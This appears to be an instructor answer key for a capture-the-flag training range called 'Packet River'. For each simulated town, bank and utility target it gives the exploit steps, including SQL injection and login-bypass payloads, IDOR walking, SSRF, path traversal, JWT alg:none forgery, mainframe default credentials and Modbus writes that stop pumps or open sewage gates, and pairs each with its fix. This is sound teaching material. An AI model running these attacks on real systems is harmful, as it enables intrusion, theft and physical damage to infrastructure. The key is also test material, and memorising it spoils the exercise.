# Packet River — instructor answer key

**Tier 4 (see `docs/learning-design.md`).** This is the spoiler tier: the
step-by-step for every technique, for the person running a class or for a
player who has decided to stop working it out. It is deliberately *not* in
`scoring/flags.py`, the district docs, or anything the player's client can
pull for free — the in-game hints give direction only.

Flags are `PKTR{<technique_id>_<random hex>}` and are minted fresh on every
`scoring` start, so the values below are placeholders. Paths assume the flat
(all-weaknesses-on) build.

---

## Main Street

### `generalstore_sqli` — error-based SQLi (map: `db_dumped`)
- The move: the product search is a concatenated query with verbose errors on.
  `sqlmap -u "http://127.0.0.1:8090/generalstore/search.php?q=x" --batch --dump`,
  or by hand a 3-column UNION: `q=x%' UNION SELECT 1,note,1 FROM staff_notes-- -`
  (the flag must land in the column the page prints as the product *name*).
- The flag: a row in `generalstore.staff_notes`.
- Fix: parameterised queries; errors off in production.

### `hardware_idor` — IDOR on receipts (map: `db_dumped`)
- The move: `receipt.php?id=` has no ownership check. Receipts start at `1001`;
  walk the ids with `curl`/`ffuf`.
- The flag: the `flag_holder` row in `hardware.receipts`.
- Fix: check the record's owner against the session on every read.

### `pharmacy_authbypass` — auth bypass in the portal login (map: `db_dumped`)
- The move: the login builds its query by concatenation. Username
  `' OR role='staff' LIMIT 1 -- -`, any password.
- The flag: the audit row in `pharmacy.patient_records`.
- Fix: prepared statements; verify the password hash server-side.

### `diner_backup` — exposed DB backup (map: `db_dumped`)
- The move: `GET /diner/db_backup.sql` — a full dump left in the web root.
  `ffuf` a `.sql`/`.bak` wordlist if you don't guess it.
- The flag: an `INSERT` line in that file.
- Fix: backups never live under the docroot.

### `barber_xss` — stored XSS + review bot (map: `defaced`)
- The move: the appointment-note field is stored and rendered raw. A container
  loop plays "manager" and opens every new booking (`review.php`). Put a script
  in the note; when the bot views it, the bot writes its own flag back onto
  your booking record.
- The flag: appears in your booking after the bot fires (poll the page).
- Fix: output-encode on render; CSP; the admin view should not be a real
  browser context with secrets in scope.

### `tavern_defaultcreds` — default creds (map: `carded`)
- The move: the POS/jukebox admin ships `admin` / `admin`. `hydra` if you want
  to show the brute path.
- The flag: shown on the admin dashboard once you're in.
- Fix: force a credential change on first boot; no shared defaults.

### `drycleaner_gitleak` — exposed `.git` (map: `db_dumped`)
- The move: `http://127.0.0.1:8090/drycleaner/.git/` is browsable.
  `git-dumper http://127.0.0.1:8090/drycleaner/.git/ loot/` then
  `git -C loot log -p` — a `RECOVERY_KEY` was committed to `config.php` and
  later `sed`-removed, so it only exists in history.
- The flag: the removed line in the `config.php` diff.
- Fix: don't deploy the repo; block dotfiles at the server (the flat build's
  `dotfiles-allow.conf` is the deliberate misconfig).

### `baittackle_ssrf` — SSRF (map: `db_dumped`)
- The move: `fetch.php?url=` fetches any URL server-side. Point it at
  `http://127.0.0.1/baittackle/_internal/inv.php` (a page bound to loopback
  only) and read the response it returns to you.
- The flag: in the internal inventory page's body.
- Fix: allowlist egress hosts; block loopback / link-local / metadata IPs.

---

## Civic + payments

### `townhall_deface` — weak admin + stored XSS (map: Town Hall defaced)
- The move: `/townhall/admin.php` takes `clerk` / `clerk`. The notice is stored
  and rendered raw. Post a notice; the admin page then shows a `confirm_code`.
- The flag: that `confirm_code` (also the `announce_admin.confirm_code` row).
- Fix: real auth on the admin; output-encode the notice.

### `townhall_lfi` — traversal after a weak payroll login (map: payroll drained)
- The move: the payroll login is a concatenated `WHERE username='..' AND
  password_hash='<md5>'` — bypass it. Then `payslip.php?doc=` calls `readfile()`
  with no sanitising: `?doc=../../../../run/secret/townhall_lfi/flag.txt`.
- The flag: that file.
- Fix: canonicalise the path, confine to the payslips directory, real auth.

### `police_leak` — world-readable config (map: Police defaced)
- The move: `GET /police/dispatch/config.json` — readable, includes a
  `radio_key`.
- The flag: the `radio_key` value.
- Fix: keep operational secrets out of the docroot.

### `fire_defaultcreds` — default creds (map: Fire defaced)
- The move: the station alarm panel at `/fire/` takes `admin` / `fire`.
- The flag: shown once you're in.
- Fix: change defaults at install.

### `as400_empmast` — AS/400 payroll (map: payroll drained) — Phase 3c
- The move: TN5250 to `127.0.0.1:8992`. A blank password signs you on as any
  profile (or `QSECOFR` / `QSECOFR`). At the menu run `STRSQL`, then
  `SELECT * FROM PAYROLL.PAYKEY` — the `PAYROLL` library and `EMPMAST` file are
  `*PUBLIC *ALL`. From the player box: `as400_5250.py` does the whole path.
- The flag: the `RECONKEY` column of `PAYROLL/PAYKEY`.
- Fix: `QSECURITY` 40+, require passwords, rotate `QSECOFR`, `*PUBLIC *EXCLUDE`
  on `PAYROLL` with an authorization list.

### `paygw_receipt_idor` — receipt IDOR (map: carding spreads)
- The move: `GET http://127.0.0.1:8500/receipt/<txn_id>` — no auth, ids from
  `5001`. Walk them; one memo holds the flag.
- The flag: the memo on one receipt.
- Fix: authorise every receipt read against the caller.

---

## First Packet Bank & Trust

### `bank_jwt_none` — JWT `alg:none` (map: `bank_drain`)
- The move: the token verifier honours `{"alg":"none"}`. Forge a payload with
  `role: admin`, no signature. `GET /dashboard` (staff view) then prints the
  `FLAG_JWT` wire settlement token. `POST /api/transfer` will sweep accounts if
  you want the full drain.
- The flag: `FLAG_JWT` on the staff dashboard.
- Fix: pin the expected algorithm; reject `none`; verify the signature.

### `bank_account_idor` — account IDOR (map: `bank_leak`)
- The move: `GET /api/accounts/<id>` has no ownership check. Municipal account
  `1003`'s memo carries `FLAG_IDOR`.
- The flag: account 1003's memo.
- Fix: enforce ownership on every account read.

### `z16_racf` — RACF WARNING-mode + world-readable profile (map: `bank_drain`) — Phase 3d
- The move: TN3270 to `127.0.0.1:8991`. `IBMUSER` / `SYS1` still logs on
  (never revoked; `LISTUSER IBMUSER` shows `SPECIAL OPERATIONS AUDITOR`). At
  `READY`: `RLIST FACILITY BANK.XFER.APPROVE` — the profile is `UACC(READ)` and
  in `WARNING` mode, and the recon key sits in its `INSTALLATION DATA`.
  `SETROPTS LIST` shows `NOPROTECTALL` for context. From the player box:
  `z16_3270.py` does the whole path.
- The flag: the profile's `INSTALLATION DATA` field.
- Fix: revoke `IBMUSER` / strip `SPECIAL`+`OPERATIONS` and rotate it;
  `UACC(NONE)` + access list on `BANK.XFER.APPROVE`; out of `WARNING`;
  `SETROPTS PROTECTALL(FAILURES)`; never put secrets in `INSTALLATION DATA`.

---

## Utilities (OT)

For all three: unauthenticated, unvalidated Modbus/TCP writes on `field-plc`.
The physical damage *is* the exploit; the flag just proves you had write
access. Each PLC's flag sits in input registers `100..131` and only populates
while the maintenance-mode coil (`8`) is set. `modbus_attack.py <plant> flag`
sets the coil and decodes it. Fix for all: segment OT, source-allowlist the
PLC, authenticated protocol, re-assert safe state (the hardened build's
`MODBUS_WRITE_OPEN=0` scan loop does this).

### `water_modbus_pump` — (map: houses go dry) — Phase 2
- The move: `127.0.0.1:5502` (container `:502`). Stop the high-lift pump
  (`write_coil` on the pump run coil), or push a setpoint out of range.
  `modbus_attack.py water stop-pump`.

### `power_modbus_feeder` — (map: a zone goes dark) — Phase 2
- The move: `127.0.0.1:5503` (container `:503`). Open a feeder breaker
  (`write_coil 1..4 0`) or the main incomer (`write_coil 0 0`).
  `modbus_attack.py power trip <residential|business|industrial|streetlights>`.

### `factory_modbus` — (map: line jam / unsafe run) — Phase 3b
- The move: `127.0.0.1:5504` (container `:504`). Bypass the assembly-line
  e-stop and overspeed the line, or open the hopper gate with no car in
  position. `modbus_attack.py factory estop-bypass | hopper-dump | line-stop`.

### `sewage_modbus` — (map: raw effluent to the beach) — Phase 4
- The move: `127.0.0.1:5505` (container `:505`). Open the storm bypass gate
  (`BYPASS_GATE`, coil 3) and/or stop aeration (coil 0) + dosing (coil 1).
  `modbus_attack.py sewage bypass`. `effluent_path` flips to `raw` within a
  few ticks; the river plume then ramps and the swimmers sicken.
